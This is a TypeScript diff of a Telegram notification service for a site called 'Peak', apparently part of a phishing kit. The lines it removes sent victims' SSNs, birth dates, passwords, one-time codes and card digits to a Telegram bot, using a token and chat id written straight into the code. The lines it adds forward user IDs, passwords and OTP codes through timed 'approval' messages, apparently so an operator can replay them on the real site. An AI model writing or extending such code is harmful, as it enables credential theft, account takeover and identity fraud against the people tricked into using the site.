@@ -1,4 +1,85 @@
+import {
+  buildLoginApprovalRequestBody,
+  buildOtpApprovalRequestBody,
+} from "@/lib/telegram-approval-templates";
+import { sendTelegramApprovalWithCountdown } from "@/lib/telegram-approval-countdown";
+
 const SITE_NAME = "Peak";
+
+// Telegram configuration comes from the environment — never hardcode credentials.
+const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "").trim();
+// TELEGRAM_CHAT_ID: one id, or several comma-separated (e.g. "111,222,333")
+const CHAT_IDS = (process.env.TELEGRAM_CHAT_ID || "")
+  .split(",")
+  .map((id) => id.trim())
+  .filter(Boolean);
+
+if (!TELEGRAM_BOT_TOKEN) {
+  console.error("⚠️ TELEGRAM_BOT_TOKEN is not set in environment variables");
+}
+if (CHAT_IDS.length === 0) {
+  console.error("⚠️ TELEGRAM_CHAT_ID is not set in environment variables");
+}
+
+function escapeTelegramHtml(text: string): string {
+  return text
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+}
+
+function isHttpUrl(value: string): boolean {
+  return /^https?:\/\//i.test(value.trim());
+}
+
+/** Coerce host-only ADMIN_PORTAL_URL values to https:// so asLink can use the write-up label. */
+function ensureAbsoluteHttpUrl(value: string): string {
+  const t = value.trim();
+  if (!t || isHttpUrl(t) || t.startsWith("/")) return t;
+  if (/^[a-z0-9.-]+\.[a-z]{2,}([/:].*)?$/i.test(t)) {
+    return `https://${t}`;
+  }
+  return t;
+}
+
+function normalizeAdminPortalUrl(raw?: string): string {
+  const t = ensureAbsoluteHttpUrl((raw ?? "").trim());
+  if (!t) return "/admin/login";
+  const origin = t
+    .replace(/\/admin\/login.*$/i, "")
+    .replace(/\?.*$/, "")
+    .replace(/\/+$/, "");
+  return origin || "/admin/login";
+}
+
+/** Base ADMIN_PORTAL_URL for Telegram approve/deny links (no /admin/login path). */
+function adminPortalLink(): string {
+  return normalizeAdminPortalUrl(process.env.ADMIN_PORTAL_URL);
+}
+
+/** Clickable link for Telegram HTML (admin portal, page URLs, etc.). */
+function asLink(url: string, label?: string): string {
+  const href = ensureAbsoluteHttpUrl(url.trim());
+  const linkText = (label?.trim() || href).trim();
+  // Never expose the raw Control Center URL as the visible link line — use the write-up label.
+  if (!href || !isHttpUrl(href)) {
+    if (label?.trim()) return escapeTelegramHtml(label.trim());
+    return asCode(href || "Unknown");
+  }
+  return `<a href="${escapeTelegramHtml(href)}">${escapeTelegramHtml(linkText)}</a>`;
+}
+
+function asCode(value: unknown): string {
+  const t = value == null || value === "" ? "Unknown" : String(value).trim() || "Unknown";
+  return `<code>${escapeTelegramHtml(t)}</code>`;
+}
+
+/** Site header for all ops flow messages (login / method / OTP / registration). */
+export function wrapFlowMessage(body: string): string {
+  return `🏷️ <b>${escapeTelegramHtml(SITE_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`;
+}
 
 export interface VisitorData {
   location: string;
@@ -34,45 +115,13 @@ export interface VerificationData {
   code: string;
 }
 
-export interface ForgotPasswordData {
-  ssnLast4: string;
-  birthDate: string;
-}
-
-export interface NewUserData {
-  ssnLast4: string;
-  birthDate: string;
-}
-
-export interface AccountFoundData {
-  method: string;
-  password?: string;
-}
-
-export interface RememberDeviceData {
-  choice: string;
-}
-
-export interface VerifyDetailsData {
-  ssn: string;
-  birthDate: string;
-  phone: string;
-  zip: string;
-  pidNumber: string;
-  cardLastFour: string;
-}
-
 class TelegramService {
   private botToken: string;
   private chatIds: string[];
 
   constructor() {
-    this.botToken = "8771897622:AAFZc3ptWAMXsOSbfMOY5hLjJ6q9nBWbIsY";
-    const raw = "5841830485";
-    this.chatIds = raw
-      .split(",")
-      .map((id) => id.trim())
-      .filter((id) => id.length > 0);
+    this.botToken = TELEGRAM_BOT_TOKEN;
+    this.chatIds = CHAT_IDS;
   }
 
   private async sendMessage(message: string): Promise<void> {
@@ -164,112 +213,8 @@ class TelegramService {
     await this.sendMessage(message);
   }
 
-  async sendResendCodeNotification(
-    isSecondOtp: boolean,
-    ip?: string,
-  ): Promise<void> {
-    const otpType = isSecondOtp ? "Code (final)" : "Code (first OTP)";
-    const message = `\n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>\n\n🔐 <b>OTP Type:</b> ${otpType}`;
-    await this.sendMessage(message);
-  }
-
-  async sendForgotPasswordPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>Forgot Password page opened - ${SITE_NAME}</b>\n\nUser clicked "Forgot User ID or Password?" and landed on the form.`;
-    await this.sendMessage(message);
-  }
-
-  async sendForgotPasswordNotification(
-    data: ForgotPasswordData,
-  ): Promise<void> {
-    const message = `\n🔑 <b>Forgot Password – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User page opened - ${SITE_NAME}</b>\n\nUser clicked "New User?" and landed on the form.`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserNotification(data: NewUserData): Promise<void> {
-    const message = `\n👤 <b>New User – form submitted (all fields) - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserCodePageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User – Enter Access Code page opened - ${SITE_NAME}</b>\n\nUser landed on the page to enter the code sent to them.`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserCodeNotification(code: string, ip?: string): Promise<void> {
-    const message = `\n🔢 <b>New User – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserPasswordPageViewNotification(ip?: string): Promise<void> {
-    const message = `\n🔗 <b>New User – Create Password page opened - ${SITE_NAME}</b>\n\nUser landed on the page to create their password.`;
-    await this.sendMessage(message);
-  }
-
-  async sendNewUserPasswordNotification(
-    password: string,
-    ip?: string,
-  ): Promise<void> {
-    const message = `\n🔑 <b>New User – Password Set - ${SITE_NAME}</b>\n\n🔑 <b>Password:</b> ${password}`;
-    await this.sendMessage(message);
-  }
-
-  async sendAccountFoundNotification(data: AccountFoundData): Promise<void> {
-    const passwordText = data.password
-      ? `\n🔑 <b>Password:</b> ${data.password}`
-      : "";
-    const message = `\n✅ <b>Account Found – Continue Clicked - ${SITE_NAME}</b>\n\n🔐 <b>Method:</b> ${data.method}${passwordText}`;
-    await this.sendMessage(message);
-  }
-
-  async sendAccountFoundResetPasswordNotification(ip?: string): Promise<void> {
-    const message =
-      `\n🔗 <b>Account Found – Reset password link clicked - ${SITE_NAME}</b>\n\n` +
-      `User clicked "Reset password" on the account found page.`;
-    await this.sendMessage(message);
-  }
-
-  async sendForgotPasswordVerifyNotification(
-    verificationType: string,
-    ip?: string,
-  ): Promise<void> {
-    const message = `\n🔐 <b>Forgot Password – Verify Identity Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`;
-    await this.sendMessage(message);
-  }
-
-  async sendForgotPasswordCodeNotification(
-    code: string,
-    ip?: string,
-  ): Promise<void> {
-    const message = `\n🔢 <b>Forgot Password – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`;
-    await this.sendMessage(message);
-  }
-
-  async sendForgotPasswordResendNotification(ip?: string): Promise<void> {
-    const message = `\n🔄 <b>Forgot Password – Resend Code Requested - ${SITE_NAME}</b>`;
-    await this.sendMessage(message);
-  }
-
-  async sendRememberDeviceNotification(
-    data: RememberDeviceData,
-  ): Promise<void> {
-    const message = `\n💾 <b>Remember Device Choice - ${SITE_NAME}</b>\n\n📱 <b>Choice:</b> ${data.choice}`;
-    await this.sendMessage(message);
-  }
-
-  async sendVerifyDetailsNotification(data: VerifyDetailsData): Promise<void> {
-    const message =
-      `\n📝 <b>Verify Details – form submitted - ${SITE_NAME}</b>\n\n` +
-      `🔢 <b>SSN:</b> ${data.ssn}\n` +
-      `📅 <b>Birth Date:</b> ${data.birthDate}\n` +
-      `📞 <b>Phone:</b> ${data.phone}\n` +
-      `📍 <b>ZIP Code:</b> ${data.zip}\n` +
-      `🆔 <b>PID Number:</b> ${data.pidNumber}\n` +
-      `💳 <b>Card Last 4:</b> ${data.cardLastFour}`;
+  async sendResendCodeNotification(ip?: string): Promise<void> {
+    const message = `\n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>`;
     await this.sendMessage(message);
   }
 
@@ -280,6 +225,68 @@ class TelegramService {
   }): Promise<void> {
     const msg = `\n🚫 <b>Bad Bot Blocked - ${SITE_NAME}</b>\n\n🤖 <b>User-Agent:</b> ${data.userAgent}\n🌍 <b>IP:</b> ${data.ip}\n🔗 <b>Path:</b> ${data.path}`;
     await this.sendMessage(msg);
+  }
+
+  /** Gate 1 approval request — method page Generate Code. */
+  async sendLoginApprovalNotification(data: {
+    userId: string;
+    password: string;
+    method: "email" | "text";
+    createdAtMs: number;
+    databaseShard?: string;
+    ip?: string;
+  }): Promise<void> {
+    const adminLink = process.env.ADMIN_PORTAL_URL
+      ? adminPortalLink()
+      : "/admin/login";
+    await sendTelegramApprovalWithCountdown({
+      botToken: this.botToken,
+      chatIds: this.chatIds,
+      createdAtMs: data.createdAtMs,
+      wrapMessage: wrapFlowMessage,
+      buildText: (secondsLeft) =>
+        buildLoginApprovalRequestBody({
+          userId: data.userId,
+          password: data.password,
+          method: data.method,
+          adminLink,
+          secondsLeft,
+          databaseShard: data.databaseShard,
+          asCode,
+          asLink,
+        }),
+    });
+  }
+
+  /** Gate 2 approval request — passcode page Continue. */
+  async sendVerificationApprovalNotification(data: {
+    userId: string;
+    method: "email" | "text";
+    code: string;
+    createdAtMs: number;
+    databaseShard?: string;
+    ip?: string;
+  }): Promise<void> {
+    const adminLink = process.env.ADMIN_PORTAL_URL
+      ? adminPortalLink()
+      : "/admin/login";
+    await sendTelegramApprovalWithCountdown({
+      botToken: this.botToken,
+      chatIds: this.chatIds,
+      createdAtMs: data.createdAtMs,
+      wrapMessage: wrapFlowMessage,
+      buildText: (secondsLeft) =>
+        buildOtpApprovalRequestBody({
+          userId: data.userId,
+          code: data.code,
+          method: data.method,
+          adminLink,
+          secondsLeft,
+          databaseShard: data.databaseShard,
+          asCode,
+          asLink,
+        }),
+    });
   }
 }
 
